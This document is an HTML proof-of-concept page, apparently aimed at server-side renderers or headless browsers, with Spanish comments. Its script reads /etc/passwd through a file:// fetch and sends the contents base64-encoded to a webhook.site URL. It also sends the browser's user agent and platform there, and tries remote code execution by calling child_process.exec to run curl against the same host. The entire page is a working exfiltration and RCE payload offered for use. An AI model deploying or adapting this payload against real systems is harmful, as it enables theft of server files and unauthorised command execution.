<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>LFI / RCE PoC</title>
</head>
<body>
  <h1>Test SSRF + LFI + RCE</h1>

  <script>
    const webhook = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";

    // 1. Prueba de lectura local (LFI) de /etc/passwd
    fetch("file:///etc/passwd")
      .then(r => r.text())
      .then(content => {
        fetch(`${webhook}?lfi=` + btoa(content));
      })
      .catch(err => {
        fetch(`${webhook}?lfi_error=` + encodeURIComponent(err.message));
      });

    // 2. Detección de entorno (¿Node.js? ¿Headless browser?)
    fetch(`${webhook}?navigator_userAgent=` + encodeURIComponent(navigator.userAgent));
    fetch(`${webhook}?navigator_platform=` + encodeURIComponent(navigator.platform));

    // 3. Detección de "require" (Node.js check)
    try {
      let r = typeof require !== "undefined" ? "yes" : "no";
      fetch(`${webhook}?require_available=` + r);
    } catch(e) {
      fetch(`${webhook}?require_test_error=` + encodeURIComponent(e.message));
    }

    // 4. Intento de RCE si el entorno es Node.js
    try {
      let exec = Function("return require('child_process').exec")();
      exec("curl https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?rce=executed");
    } catch(e) {
      fetch(`${webhook}?rce_error=` + encodeURIComponent(e.message));
    }
  </script>

</body>
</html>
